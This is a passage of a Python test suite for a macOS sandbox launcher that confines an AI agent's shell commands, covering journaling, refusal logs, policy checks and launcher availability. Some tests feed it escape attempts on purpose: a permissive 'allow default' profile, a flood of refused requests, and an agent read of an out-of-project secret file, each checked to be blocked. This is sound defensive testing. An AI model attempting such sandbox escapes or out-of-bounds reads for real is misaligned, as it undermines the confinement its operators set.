        assert end[0]["signal"] == signal.SIGKILL

    def test_the_journal_lines_have_the_exact_shape(self, w):
        w.start()
        subprocess.run(w.stub(w.argv(["/bin/bash", "-c", "exit 3\nexit $?", "iclone-confined:project:x:s-9"],
                                     session="s-9")), timeout=20, cwd=str(w.proj))
        assert _wait_for(lambda: len(w.journal()) >= 2)
        start, end = w.journal()
        assert set(start) == {"v", "ev", "ts", "run", "pid", "kind", "cls", "sha", "session", "command", "cwd",
                              "project", "net", "write", "origin"}
        assert (start["v"], start["ev"], start["kind"], start["cls"], start["session"], start["command"]) == \
            (1, "start", "shell", "project", "s-9", "exit 3")
        # A bare script, not Hermes' wrapper: the environment's own.
        assert start["origin"] == "runtime"
        assert start["sha"] == w.sha and start["cwd"] == str(w.proj) and start["run"].startswith("project+")
        assert end == {"v": 1, "ev": "end", "ts": end["ts"], "run": start["run"], "pid": start["pid"], "code": 3,
                       "signal": None}
        assert stat.S_IMODE(os.stat(w.ledger / "runs.jsonl").st_mode) == 0o600

    def test_a_refusal_reaches_the_caller_and_the_journal(self, w):
        w.start()
        out = subprocess.run(w.stub(w.argv(["/bin/echo", "x"], profile="(version 1)(allow default)")),
                             capture_output=True, text=True, timeout=20)
        assert out.returncode == 126
        assert out.stderr.startswith("Refused by icloneOS confinement: the profile is not one the app generated")
        (row,) = w.refused()
        assert set(row) == {"v", "ev", "ts", "last", "count", "session", "command", "code", "detail"}
        assert (row["ev"], row["code"], row["command"], row["count"]) == ("refused", "profile-unknown", "/bin/echo x", 1)
        assert w.journal() == [] and stat.S_IMODE(os.stat(w.ledger / "refused.jsonl").st_mode) == 0o600

    def test_a_token_that_already_started_a_run_never_starts_a_second(self, w):
        # Main folds one run per token (the first start): a second start on the same token would be a command the
        # ledger never shows, whose refusals and processes land on the first run.
        launcher = w.start()
        argv = w.argv(["/bin/sh", "-c", "exit 0"])
        first = subprocess.run(w.stub(argv), capture_output=True, text=True, timeout=20)
        assert first.returncode == 0, first.stderr
        assert _wait_for(lambda: any(row["ev"] == "end" for row in w.journal()))
        again = subprocess.run(w.stub(argv), capture_output=True, text=True, timeout=20)
        assert again.returncode == 126
        assert "already started a run" in again.stderr, again.stderr
        assert [row["ev"] for row in w.journal()] == ["start", "end"]
        assert w.refused()[-1]["code"] == "bad-request"
        # A launcher main restarts on the same ledger still knows it.
        launcher.stop()
        w.launcher = None
        w.start()
        later = subprocess.run(w.stub(argv), capture_output=True, text=True, timeout=20)
        assert later.returncode == 126 and "already started a run" in later.stderr, later.stderr
        fresh = subprocess.run(w.stub(w.argv(["/bin/sh", "-c", "exit 0"])), capture_output=True, text=True, timeout=20)
        assert fresh.returncode == 0, fresh.stderr

    def test_started_tokens_reads_both_generations_and_keeps_the_newest(self, w):
        w.ledger.mkdir(mode=0o700, exist_ok=True)
        (w.ledger / "runs.jsonl.1").write_text(json.dumps({"ev": "start", "run": "a"}) + "\n" + "torn{\n")
        (w.ledger / "runs.jsonl").write_text(json.dumps({"ev": "end", "run": "b"}) + "\n"
                                             + json.dumps({"ev": "start", "run": "c"}) + "\n")
        assert L.started_tokens(str(w.ledger / "runs.jsonl")) == ["a", "c"]
        assert L.started_tokens(str(w.root / "missing" / "runs.jsonl")) == []
        assert L.started_tokens("") == []

    def test_the_remembered_tokens_stay_bounded(self, w, monkeypatch):
        monkeypatch.setattr(L, "STARTED_REMEMBERED", 2)
        w.start()
        for _ in range(3):
            out = subprocess.run(w.stub(w.argv(["/bin/sh", "-c", "exit 0"])), capture_output=True, timeout=20)
            assert out.returncode == 0
        assert len(w.launcher.started) == 2

    def test_an_unreachable_launcher_refuses_with_126(self, w):
        out = subprocess.run(w.stub(w.argv(["/bin/echo"])), capture_output=True, text=True, timeout=20)
        assert out.returncode == 126
        assert out.stderr == "Refused by icloneOS confinement: the launcher is not answering\n"

    def test_the_journal_rotates_above_one_mebibyte(self, w):
        w.ledger.mkdir(mode=0o700, exist_ok=True)
        (w.ledger / "runs.jsonl").write_bytes(b"x" * (L.JOURNAL_ROTATE + 1))
        L.Journal(str(w.ledger)).append({"ev": "end"})
        assert (w.ledger / "runs.jsonl.1").stat().st_size == L.JOURNAL_ROTATE + 1
        assert json.loads((w.ledger / "runs.jsonl").read_text())["ev"] == "end"

    def test_a_request_without_three_fds_is_refused(self, w):
        import socket as socket_mod

        w.start()
        sock = socket_mod.socket(socket_mod.AF_UNIX, socket_mod.SOCK_STREAM)
        sock.connect(w.socket)
        body = json.dumps(w.request(["/bin/echo"])).encode()
        sock.sendall(len(body).to_bytes(4, "big") + body)
        reply = L.recv_msg(sock, bytearray())
        assert reply["ok"] is False and reply["code"] == "bad-request"


def _send(w, req) -> dict:
    """One request straight over the launcher's socket, framed and carrying three fds as the stub sends it: a flood of
    thousands in process, with no interpreter start per request."""
    null = os.open(os.devnull, os.O_RDWR)
    sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    try:
        sock.settimeout(10.0)
        sock.connect(w.socket)
        data = json.dumps(req).encode("utf-8")
        frame = len(data).to_bytes(4, "big") + data
        sent = socket.send_fds(sock, [frame], [null, null, null])
        if sent < len(frame):
            sock.sendall(frame[sent:])
        return L.recv_msg(sock, bytearray())
    finally:
        sock.close()
        os.close(null)


BAD_PROFILE = "(version 1)(allow default)"


class TestARefusalFlood:
    """The runtime can make the launcher refuse at will (it reaches the socket); refusals must never cost the record of
    what ran."""

    def _finished_run(self, w) -> str:
        out = subprocess.run(w.stub(w.argv(["/bin/echo", "the-finished-run"])), capture_output=True, text=True,
                             timeout=20, cwd=str(w.proj))
        assert (out.returncode, out.stdout) == (0, "the-finished-run\n"), out.stderr
        assert _wait_for(lambda: [r["ev"] for r in w.journal()] == ["start", "end"])
        return w.journal()[0]["run"]

    def test_a_flood_of_refusals_leaves_every_start_and_end_row_in_the_ledger(self, w):
        w.start()
        token = self._finished_run(w)
        # Long commands, half of them all different (nothing to collapse) and half the same one.
        for i in range(1500):
            command = ["/bin/echo", "x" * 1990 + (str(i) if i % 2 else "")]
            reply = _send(w, w.request(command, profile=BAD_PROFILE))
            assert reply == {"ok": False, "code": "profile-unknown", "error": "the profile is not one the app generated"}
        rows = w.journal("runs.jsonl.1") + w.journal()
        assert [r["ev"] for r in rows if r.get("run") == token] == ["start", "end"]
        assert [r["ev"] for r in rows] == ["start", "end"]
        assert not (w.ledger / "runs.jsonl.1").exists()
        w.launcher.stop()
        sizes = [os.path.getsize(w.ledger / name) for name in ("refused.jsonl", "refused.jsonl.1")
                 if (w.ledger / name).exists()]
        # Two generations of at most the rotation size each, plus the one row that crosses it.
        assert sum(sizes) <= 2 * L.REFUSED_ROTATE + L.REFUSED_ROW_MAX, sizes
        for name in ("refused.jsonl", "refused.jsonl.1"):
            if (w.ledger / name).exists():
                assert stat.S_IMODE(os.stat(w.ledger / name).st_mode) == 0o600
        refused = w.refused()
        assert all(r["ev"] == "refused" and len(r["command"]) <= L.REFUSED_COMMAND_CLIP for r in refused)

    def test_identical_refusals_collapse_into_a_few_rows_whose_counts_add_up(self, w):
        w.start()
        token = self._finished_run(w)
        began = time.monotonic()
        for _ in range(1500):
            assert _send(w, w.request(["/bin/echo", "x" * 1990], profile=BAD_PROFILE))["ok"] is False
        windows = int((time.monotonic() - began) / L.REFUSED_WINDOW_S) + 1  # a loaded machine crosses more than one window
        w.launcher.stop()  # closes the open window: its count is written
        refused = w.refused()
        assert sum(r["count"] for r in refused) == 1500
        assert len(refused) <= 2 * windows + 2, [r["count"] for r in refused]
        assert sum(len(json.dumps(r)) + 1 for r in refused) < 8 * 1024
        assert {r["command"] for r in refused} == {"/bin/echo " + "x" * (L.REFUSED_COMMAND_CLIP - len("/bin/echo "))}
        assert all(r["last"] >= r["ts"] for r in refused)
        assert [(r["ev"], r["run"]) for r in w.journal()] == [("start", token), ("end", token)]


class TestRefusalLog:
    """The launcher's refusal file on its own: coalescing windows, clipping, rotation."""

    class Clock:
        def __init__(self):
            self.now = 1000.0

        def __call__(self):
            return self.now

    def _log(self, w, clock, **kw):
        w.ledger.mkdir(mode=0o700, exist_ok=True)
        return L.RefusalLog(str(w.ledger), clock=clock, flusher=False, **kw)

    def test_a_row_of_wide_and_control_characters_stays_within_the_stated_byte_bound(self, w):
        clock = self.Clock()
        log = self._log(w, clock)
        wide = "\U0001F600" * (2 * L.REFUSED_COMMAND_CLIP)
        control = "\x01\"" * L.REFUSED_DETAIL_CLIP
        log.record(session=None, command=wide, code="bad-request", detail=control)
        log.record(session=None, command=control, code="bad-request", detail=wide)
        lines = (w.ledger / "refused.jsonl").read_bytes().splitlines()
        assert len(lines) == 2
        assert max(len(line) for line in lines) <= L.REFUSED_ROW_MAX, [len(line) for line in lines]
        rows = [json.loads(line) for line in lines]
        assert rows[0]["command"] == wide[:L.REFUSED_COMMAND_CLIP]
        assert rows[0]["detail"] == control[:L.REFUSED_DETAIL_CLIP]
        assert rows[1]["command"] == control[:L.REFUSED_COMMAND_CLIP]
        assert rows[1]["detail"] == wide[:L.REFUSED_DETAIL_CLIP]

    def test_a_refusal_after_close_is_a_row_of_its_own_and_leaves_no_window_open(self, w):
        clock = self.Clock()
        log = self._log(w, clock)
        for _ in range(3):
            log.record(session=None, command="early", code="bad-request", detail="d")
        log.close()
        assert [r["count"] for r in w.refused()] == [1, 2]
        for _ in range(5):
            log.record(session=None, command="late", code="bad-request", detail="d")
        late = [r for r in w.refused() if r["command"] == "late"]
        assert [r["count"] for r in late] == [1, 1, 1, 1, 1]
        assert log.open == {}
        assert sum(r["count"] for r in w.refused()) == 8

    def test_the_first_refusal_is_written_at_once_and_repeats_inside_the_window_wait_for_its_close(self, w):
        clock = self.Clock()
        log = self._log(w, clock)
        for _ in range(3):
            log.record(session="s-1", command="/bin/echo x", code="profile-unknown", detail="nope")
        first, = w.refused()
        assert first == {"v": 1, "ev": "refused", "ts": first["ts"], "last": first["ts"], "count": 1,
                         "session": "s-1", "command": "/bin/echo x", "code": "profile-unknown", "detail": "nope"}
        clock.now += L.REFUSED_WINDOW_S
        log.flush_expired()
        first, summary = w.refused()
        assert summary["count"] == 2 and summary["last"] >= summary["ts"] >= first["ts"]
        assert (summary["command"], summary["code"], summary["detail"]) == ("/bin/echo x", "profile-unknown", "nope")
        # The window closed: the next one is written at once again.
        log.record(session="s-1", command="/bin/echo x", code="profile-unknown", detail="nope")
        assert [r["count"] for r in w.refused()] == [1, 2, 1]

    def test_a_different_code_detail_command_or_session_is_its_own_row(self, w):
        log = self._log(w, self.Clock())
        base = {"session": "s-1", "command": "c", "code": "bad-request", "detail": "d"}
        for change in ({}, {"session": "s-2"}, {"command": "c2"}, {"code": "profile-unknown"}, {"detail": "d2"}, {}):
            log.record(**{**base, **change})
        assert len(w.refused()) == 5

    def test_closing_writes_every_open_count(self, w):
        log = self._log(w, self.Clock())
        for _ in range(4):
            log.record(session=None, command="a", code="other", detail="x")
            log.record(session=None, command="b", code="other", detail="x")
        log.close()
        counts = sorted(r["count"] for r in w.refused())
        assert counts == [1, 1, 3, 3]

    def test_open_windows_are_bounded_the_least_recently_refused_closes_first(self, w):
        log = self._log(w, self.Clock())
        log.record(session=None, command="first", code="other", detail="x")
        log.record(session=None, command="first", code="other", detail="x")
        for i in range(L.REFUSED_OPEN_MAX):
            log.record(session=None, command=f"other-{i}", code="other", detail="x")
        assert [r["count"] for r in w.refused() if r["command"] == "first"] == [1, 1]

    def test_a_repeat_stays_coalesced_while_varied_refusals_churn_the_windows(self, w):
        log = self._log(w, self.Clock())
        for i in range(10 * L.REFUSED_OPEN_MAX):
            log.record(session=None, command="busy", code="other", detail="x")
            log.record(session=None, command=f"varied-{i}", code="other", detail="x")
        log.close()
        busy = [r["count"] for r in w.refused() if r["command"] == "busy"]
        assert busy == [1, 10 * L.REFUSED_OPEN_MAX - 1]

    def test_command_and_detail_are_clipped(self, w):
        log = self._log(w, self.Clock())
        log.record(session=None, command="c" * 10_000, code="other", detail="d" * 10_000)
        row, = w.refused()
        assert (len(row["command"]), len(row["detail"])) == (L.REFUSED_COMMAND_CLIP, L.REFUSED_DETAIL_CLIP)

    def test_the_refusal_file_rotates_on_its_own(self, w):
        w.ledger.mkdir(mode=0o700, exist_ok=True)
        (w.ledger / "runs.jsonl").write_text('{"v": 1, "ev": "start"}\n')
        (w.ledger / "refused.jsonl").write_bytes(b"x" * (L.REFUSED_ROTATE + 1))
        log = self._log(w, self.Clock())
        log.record(session=None, command="c", code="other", detail="d")
        assert (w.ledger / "refused.jsonl.1").stat().st_size == L.REFUSED_ROTATE + 1
        assert json.loads((w.ledger / "refused.jsonl").read_text())["command"] == "c"
        assert (w.ledger / "runs.jsonl").read_text() == '{"v": 1, "ev": "start"}\n'
        assert stat.S_IMODE(os.stat(w.ledger / "refused.jsonl").st_mode) == 0o600

    def test_the_flusher_closes_a_window_without_another_refusal(self, w):
        w.ledger.mkdir(mode=0o700, exist_ok=True)
        log = L.RefusalLog(str(w.ledger), window=0.2)
        try:
            for _ in range(5):
                log.record(session=None, command="c", code="other", detail="d")
            assert _wait_for(lambda: sum(r["count"] for r in w.refused()) == 5, timeout=5)
        finally:
            log.close()


class TestLauncherProcess:
    def test_ready_line_permissions_and_exit_when_main_dies(self, w):
        env = {"ICLONE_CONFINEMENT_SPEC": w.spec, "ICLONE_LAUNCHER_SOCKET": w.socket,
               "ICLONE_LAUNCHER_JOURNAL_DIR": str(w.ledger), "PATH": "/usr/bin:/bin:/usr/sbin:/sbin", "LANG": "C"}
        # A stand-in "main" that starts the launcher and dies two seconds later.
        main = subprocess.Popen(["/bin/sh", "-c", f'"{sys.executable}" -I -S "{LAUNCHER_PY}" & sleep 2'],
                                stdout=subprocess.PIPE, text=True, env=env)
        line = main.stdout.readline()
        assert line.startswith(L.READY + " "), line
        pid = int(line.split()[1])
        assert stat.S_IMODE(os.stat(w.run_dir).st_mode) == 0o700
        assert stat.S_IMODE(os.stat(w.ledger).st_mode) == 0o700
        assert stat.S_ISSOCK(os.lstat(w.socket).st_mode) and stat.S_IMODE(os.lstat(w.socket).st_mode) == 0o600
        main.wait(timeout=10)

        def gone():
            try:
                os.kill(pid, 0)
            except ProcessLookupError:
                return True
            return False

        assert _wait_for(gone, timeout=6), "the launcher outlived its parent"
        assert not os.path.exists(w.socket)


@pytest.mark.skipif(not LIVE, reason="macOS sandbox-exec only")
class TestLive:
    def test_a_real_deny_default_profile_through_stub_and_launcher(self):
        from tests.plugins.test_iclone_confinement import MINI_PROFILE

        world = World(MINI_PROFILE)
        try:
            world.start(sandbox_exec=L.SANDBOX_EXEC)
            inside = subprocess.run(world.stub(world.argv(["/bin/cat", str(world.proj / "README")])),
                                    capture_output=True, text=True, timeout=30, cwd=str(world.proj))
            assert (inside.returncode, inside.stdout) == (0, "inside\n"), inside.stderr
            outside = subprocess.run(world.stub(world.argv(["/bin/cat", str(world.root / "outside.txt")])),
                                     capture_output=True, text=True, timeout=30, cwd=str(world.proj))
            assert outside.returncode == 1 and "outside-secret" not in outside.stdout
            assert "Operation not permitted" in outside.stderr, outside.stderr
        finally:
            world.close()


class TestRuntimeSide:
    """The plugin's half: unchanged unless the runtime is confined; then the stub form, or a journaled refusal."""

    def test_off_the_argv_is_untouched(self, monkeypatch):
        monkeypatch.delenv("ICLONE_RUNTIME_CONFINED", raising=False)
        monkeypatch.setenv("ICLONE_CONFINEMENT_LAUNCHER", "/nonexistent.sock")
        argv = [L.SANDBOX_EXEC, "-p", "x", "/bin/echo"]
        assert L.core.via_launcher(argv) is argv

    def test_on_the_stub_carries_the_exact_argv(self, w, monkeypatch):
        w.start()
        monkeypatch.setenv("ICLONE_RUNTIME_CONFINED", "1")
        monkeypatch.setenv("ICLONE_CONFINEMENT_LAUNCHER", w.socket)
        argv = [L.SANDBOX_EXEC, "-p", "x", "/bin/echo"]
        assert L.core.via_launcher(argv) == [sys.executable, "-I", "-S", os.path.realpath(STUB_PY), w.socket, "--",
                                             *argv]

    def test_a_missing_launcher_refuses_and_is_journaled(self, w, monkeypatch):
        monkeypatch.setenv("ICLONE_RUNTIME_CONFINED", "1")
        monkeypatch.setenv("ICLONE_CONFINEMENT_LAUNCHER", w.socket)
        monkeypatch.delenv("ICLONE_LAUNCHER_JOURNAL_DIR", raising=False)
        with pytest.raises(L.core.ConfinementRefused) as err:
            L.core.via_launcher([L.SANDBOX_EXEC])
        assert err.value.code == "launcher-unavailable"
        L.core.record_refusal("sess-2", "make test", err.value)
        (row,) = [json.loads(x) for x in (w.run_dir / "refused.jsonl").read_text().splitlines()]
        assert row == {"v": 1, "ev": "refused", "ts": row["ts"], "session": "sess-2", "command": "make test",
                       "code": "launcher-unavailable", "detail": "the launcher is not answering"}
        assert stat.S_IMODE(os.stat(w.run_dir / "refused.jsonl").st_mode) == 0o600


@pytest.mark.skipif(not LIVE, reason="macOS sandbox-exec only")
class TestSeatbeltThroughTheLauncherLive:
    def test_the_agents_shell_runs_confined_through_stub_and_launcher(self, tmp_path, monkeypatch):
        from tests.plugins.test_iclone_confinement import TestSeatbeltLive

        root, project, _, sha, env = TestSeatbeltLive().world(tmp_path, monkeypatch)
        run = Path(os.path.realpath(tempfile.mkdtemp(prefix="icl-", dir="/tmp"))) / "run"
        ledger = run.parent / "ledger"
        ledger.mkdir(parents=True, exist_ok=True)  # fx13 (L1): no policy from main is no policy, and no run
        (ledger / L.POLICY_FILE).write_text(json.dumps({"v": 1, "body": _body("acceptEdits"), "projects": [str(project)]}))
        launcher = L.Launcher(env._index, str(run / "launcher.sock"), str(ledger))
        launcher.bind()
        threading.Thread(target=launcher.serve_forever, daemon=True).start()
        monkeypatch.setenv("ICLONE_RUNTIME_CONFINED", "1")
        monkeypatch.setenv("ICLONE_CONFINEMENT_LAUNCHER", str(run / "launcher.sock"))
        try:
            ok = env.execute("cat README")
            assert ok["returncode"] == 0 and "inside" in ok["output"], ok
            leak = env.execute(f"cat {root}/outside.txt")
            assert leak["returncode"] != 0 and "outside-secret" not in leak["output"]
            rows = [json.loads(x) for x in (ledger / "runs.jsonl").read_text().splitlines()]
            starts = [r for r in rows if r["ev"] == "start"]
            # the command is the agent's own line, not Hermes' wrapper script around it
            assert [r["command"] for r in starts] == ["cat README", f"cat {root}/outside.txt"]
            assert not (run / "runs.jsonl").exists()
            assert all(r["kind"] == "shell" and r["sha"] == sha and r["project"] == str(project) for r in starts)
        finally:
            launcher.stop()
        down = env.execute("echo never")
        assert down["returncode"] == 126 and "the launcher is not answering" in down["output"]
        (row,) = [json.loads(x) for x in (run / "refused.jsonl").read_text().splitlines()]
        assert row["code"] == "launcher-unavailable" and "echo never" in row["command"]
        shutil.rmtree(run.parent, ignore_errors=True)


def _runtime_env(monkeypatch, w, *, socket_path=None):
    """The env main gives a Hermes under its runtime profile (index.ts ``spawnEnv``), pointing at this world."""
    monkeypatch.setenv("ICLONE_RUNTIME_CONFINED", "1")
    monkeypatch.setenv("ICLONE_CONFINEMENT_LAUNCHER", w.socket if socket_path is None else socket_path)
    monkeypatch.setenv("ICLONE_CONFINEMENT_DIR", str(w.profiles))


def _seatbelt(monkeypatch, *, sandbox_exec_visible: bool):
    """The plugin's Seatbelt provider on a Mac whose ``/usr/bin`` this process may (or, under the runtime profile, may
    not) stat: the profile denies it, so ``os.path.exists`` answers False for sandbox-exec there."""
    from tests.plugins.test_iclone_confinement import ACTIVE_ENV, _load, _sub

    mod = _load(ACTIVE_ENV)
    providers = _sub(mod, "providers")
    monkeypatch.setattr(providers.platform, "system", lambda: "Darwin")
    real_exists = os.path.exists
    monkeypatch.setattr(providers.os.path, "exists",
                        lambda p: sandbox_exec_visible if p == L.SANDBOX_EXEC else real_exists(p))
    return mod, providers


class TestCommandsAvailableUnderTheRuntimeProfile:
    """Under the runtime profile the runtime cannot stat /usr/bin/sandbox-exec and never execs it: the launcher does.
    The terminal is available exactly while the launcher answers; down, it is unavailable with a plain reason."""

    def test_the_terminal_is_available_while_the_launcher_answers_though_sandbox_exec_is_out_of_sight(self, w, monkeypatch):
        w.start()
        _runtime_env(monkeypatch, w)
        _, providers = _seatbelt(monkeypatch, sandbox_exec_visible=False)
        provider = providers.SeatbeltProvider()
        assert provider.is_available() is True
        assert provider.probe() == ("ready", "")
        assert provider.availability() == (True, "")

    def test_a_ping_is_answered_and_journals_nothing(self, w, monkeypatch):
        w.start()
        _runtime_env(monkeypatch, w)
        assert L.core.launcher_problem() is None
        assert w.refused() == [] and w.journal() == []

    def test_a_request_without_fds_that_is_not_the_ping_is_still_refused(self, w):
        w.start()
        sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        try:
            sock.settimeout(10.0)
            sock.connect(w.socket)
            body = json.dumps({"v": 1, "op": "ping", "argv": ["/bin/echo"]}).encode()
            sock.sendall(len(body).to_bytes(4, "big") + body)
            reply = L.recv_msg(sock, bytearray())
        finally:
            sock.close()
        assert reply["ok"] is False and reply["code"] == "bad-request"

    @pytest.mark.parametrize("state", ["no socket", "stale socket", "not a socket", "socket not named"])
    def test_launcher_down_means_unavailable_with_a_plain_reason(self, w, monkeypatch, state):
        w.run_dir.mkdir(mode=0o700, exist_ok=True)
        if state == "stale socket":  # bound once, nobody listening: connect is refused
            stale = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            stale.bind(w.socket)
            stale.close()
        elif state == "not a socket":
            Path(w.socket).write_text("")
        _runtime_env(monkeypatch, w, socket_path="" if state == "socket not named" else None)
        _, providers = _seatbelt(monkeypatch, sandbox_exec_visible=True)
        provider = providers.SeatbeltProvider()
        reason = (L.core.LAUNCHER_NOT_NAMED if state == "socket not named" else L.core.LAUNCHER_UNREACHABLE)
        assert provider.availability() == (False, reason)
        assert provider.is_available() is False
        assert provider.probe() == ("unavailable", f"Agent commands are unavailable: {reason}.")
        with pytest.raises(providers.core.ConfinementRefused) as refused:
            provider.create_environment(cwd=str(w.proj), timeout=5)
        assert refused.value.code == "launcher-unavailable"
        assert str(refused.value) == f"{reason}; commands are refused rather than run unconfined"

    def test_a_launcher_that_stops_answering_turns_the_terminal_off(self, w, monkeypatch):
        launcher = w.start()
        _runtime_env(monkeypatch, w)
        _, providers = _seatbelt(monkeypatch, sandbox_exec_visible=False)
        provider = providers.SeatbeltProvider()
        assert provider.is_available() is True
        launcher.stop()
        w.launcher = None
        assert provider.availability() == (False, L.core.LAUNCHER_UNREACHABLE)

    def test_outside_the_runtime_profile_the_sandbox_exec_check_stays(self, w, monkeypatch):
        monkeypatch.delenv("ICLONE_RUNTIME_CONFINED", raising=False)
        monkeypatch.setenv("ICLONE_CONFINEMENT_LAUNCHER", w.socket)  # named but not used: no runtime profile
        monkeypatch.setenv("ICLONE_CONFINEMENT_DIR", str(w.profiles))
        _, providers = _seatbelt(monkeypatch, sandbox_exec_visible=False)
        assert providers.SeatbeltProvider().availability() == (False, "sandbox-exec is missing on this Mac")
        _, providers = _seatbelt(monkeypatch, sandbox_exec_visible=True)
        assert providers.SeatbeltProvider().availability() == (True, "")

    def test_hermes_own_requirement_check_offers_the_terminal_through_the_plugin(self, w, monkeypatch):
        """``check_terminal_requirements`` (the terminal tool's check_fn, and the file tools') asks the registered
        plugin backend: offered while the launcher answers, withheld with the plugin's reason recorded when it does
        not."""
        from agent import terminal_env_registry
        from tools import terminal_tool, terminal_tool_backends

        launcher = w.start()
        _runtime_env(monkeypatch, w)
        monkeypatch.setenv("TERMINAL_ENV", "iclone_seatbelt")
        _, providers = _seatbelt(monkeypatch, sandbox_exec_visible=False)
        provider = providers.SeatbeltProvider()
        monkeypatch.setattr(terminal_tool_backends, "_get_plugin_env_provider",
                            lambda name: provider if name == "iclone_seatbelt" else None)
        assert terminal_env_registry is not None
        assert terminal_tool.check_terminal_requirements() is True
        launcher.stop()
        w.launcher = None
        assert terminal_tool.check_terminal_requirements() is False
        assert "iclone_seatbelt" in (terminal_tool.terminal_backend_unavailable_reason() or "")


class TestTheAcknowledgementCarriesCommandAvailability:
    @staticmethod
    def _own(path: Path) -> Path:
        """G22 B1: the file this process acknowledges in, beside the path main named."""
        return path.with_name(f"{path.stem}.{os.getpid()}{path.suffix}")

    def _ack(self, path: Path) -> dict:
        return json.loads(self._own(path).read_text())

    def test_register_writes_whether_commands_can_run_and_rewrites_it_when_that_changes(self, w, monkeypatch, tmp_path):
        from tests.plugins.test_iclone_confinement import FakeCtx

        ack = tmp_path / "run" / "hermes-ack.json"
        monkeypatch.setenv("ICLONE_CONFINEMENT_ACK", str(ack))
        launcher = w.start()
        _runtime_env(monkeypatch, w)
        mod, providers = _seatbelt(monkeypatch, sandbox_exec_visible=False)
        monkeypatch.setattr(mod, "pin_terminal_backend", lambda: None)
        ctx = FakeCtx()
        mod.register(ctx)
        assert self._ack(ack) == {"v": 2, "pid": os.getpid(), "backend": "iclone_seatbelt",
                                  "commands": {"available": True, "reason": ""}}
        assert stat.S_IMODE(self._own(ack).stat().st_mode) == 0o600
        seatbelt = next(p for p in ctx.providers if p.name == "iclone_seatbelt")
        launcher.stop()
        w.launcher = None
        assert seatbelt.is_available() is False
        assert self._ack(ack)["commands"] == {"available": False, "reason": L.core.LAUNCHER_UNREACHABLE}
        before = self._own(ack).stat().st_mtime_ns, self._own(ack).stat().st_ino
        assert seatbelt.is_available() is False
        assert (self._own(ack).stat().st_mtime_ns, self._own(ack).stat().st_ino) == before  # the same answer is not written again
        w.start()
        assert seatbelt.is_available() is True
        assert self._ack(ack)["commands"] == {"available": True, "reason": ""}

    def test_a_container_backend_says_commands_do_not_run(self, w, monkeypatch, tmp_path):
        from tests.plugins.test_iclone_confinement import FakeCtx, _load

        ack = tmp_path / "hermes-ack.json"
        monkeypatch.setenv("ICLONE_CONFINEMENT_ACK", str(ack))
        mod = _load({"ICLONE_CONFINEMENT": "1", "TERMINAL_ENV": "iclone_container", "ICLONE_CONFINEMENT_DIR": "/x"})
        monkeypatch.setattr(mod, "pin_terminal_backend", lambda: None)
        mod.register(FakeCtx())
        assert self._ack(ack)["commands"]["available"] is False
        assert "iclone_container" in self._ack(ack)["commands"]["reason"]

    def test_g22_two_runtimes_each_keep_their_own_acknowledgement(self, tmp_path):
        ack = str(tmp_path / "run" / "hermes-ack.json")
        code = ("import importlib.util, sys; spec = importlib.util.spec_from_file_location('c', sys.argv[1]); m = importlib.util.module_from_spec(spec);"
                "sys.modules['c'] = m; spec.loader.exec_module(m); m.write_ack(sys.argv[2], 'iclone_seatbelt', (False, 'second runtime'))")
        L.core.write_ack(ack, "iclone_seatbelt", (True, ""))
        subprocess.run([sys.executable, "-c", code, L.core.__file__, ack], check=True, capture_output=True)
        bodies = sorted((json.loads(p.read_text()) for p in (tmp_path / "run").glob("hermes-ack.*.json")), key=lambda b: b["pid"] != os.getpid())
        assert [b["commands"]["available"] for b in bodies] == [True, False] and bodies[0]["pid"] != bodies[1]["pid"]

    def test_the_reason_is_clipped(self, tmp_path):
        ack = tmp_path / "ack.json"
        L.core.write_ack(str(ack), "iclone_seatbelt", (False, "x" * 5000))
        assert len(self._ack(ack)["commands"]["reason"]) == L.core.ACK_REASON_MAX


# --- fx7 (A-M1): the flags are the request's word, the ceiling is main's ---------------------------------------------


def _flags(w, net="0", write="1", session=None, profile=None, project=None, git="locked") -> list:
    return [f"PROJECT_ROOT={project or w.proj}", f"SCRATCH={w.scratch}", f"OUTPUT_DIR={w.scratch / 'output'}",
            f"NET={net}", f"WRITE_PROJECT={write}", f"PROJECT_GIT={git}", f"MEMBER={w.token(session, profile)}"]


class TestPolicyFromMain:
    def test_no_policy_file_refuses_the_run(self, w):
        # fx13 (lens3-policy L1): no policy from main is no policy, and nothing decides without one — not Plan, not
        # read-only; the run is refused, as the module docstring promises.
        (w.ledger / L.POLICY_FILE).unlink()
        for flags in (_flags(w, write="1"), _flags(w, net="1", write="0"), _flags(w, write="0")):
            err = _refused(w, w.request(["/bin/echo"], params=flags))
            assert err.code == "policy" and str(err) == L.NO_POLICY

    def test_plan_everywhere_refuses_writes_with_a_true_reason_and_reads_go(self, w):
        # fx13 (lens3-normal M2, S3): when every mode set is Plan, a read-only request runs (read_file and search
        # work); a wider one is refused, and the reason names Plan — or the switch, or the modes — never "every mode
        # is Plan" when it is not.
        w.policy("plan")
        err = _refused(w, w.request(["/bin/echo"], params=_flags(w, write="1")))
        assert err.code == "policy" and str(err) == f"{L.NO_MODE_WRITES} ({L.PLAN_EVERYWHERE})"
        plan = w.validator().request(w.request(["/bin/echo"], params=_flags(w, write="0")))
        assert (plan["start"]["net"], plan["start"]["write"]) == (False, False) and "narrowed" not in plan["start"]
        # One wider mode anywhere (a session the request does not even name) and the write goes.
        w.policy("plan", sessions={"some-other-session": "acceptEdits"})
        assert w.validator().request(w.request(["/bin/echo"], params=_flags(w, write="1")))["start"]["write"] is True
        # A switch off refuses with the switch's name; the modes are not Plan and the reason never says they are.
        w.policy("automatic", ceilings={"fileWriting": "off"}, ceilingKey={"Wp": "fileWriting", "X": "terminal"})
        err = _refused(w, w.request(["/bin/echo"], params=_flags(w, write="1")))
        assert err.code == "policy" and "the File writing switch is off" in str(err) and L.PLAN_EVERYWHERE not in str(err)
        assert w.validator().request(w.request(["/bin/echo"], params=_flags(w, write="0")))["start"]["write"] is False

    def test_every_mode_maps_three_ways_allow_ask_refuse(self, w):
        # allow → the flag; ask (Manual) → the flag only with a pass, else narrowed to 0 and said; refuse → refused.
        for standing, net, write in (("acceptEdits", False, True), ("automatic", True, True)):
            w.policy(standing)
            plan = w.validator().request(w.request(["/bin/echo"], params=_flags(
                w, net="1" if net else "0", write="1" if write else "0")))
            assert (plan["start"]["net"], plan["start"]["write"]) == (net, write), standing
            assert "narrowed" not in plan["start"] and plan["stderr"] == []
        w.policy("acceptEdits")  # N is Q: NET=1 without a pass runs without the network, and the row says why
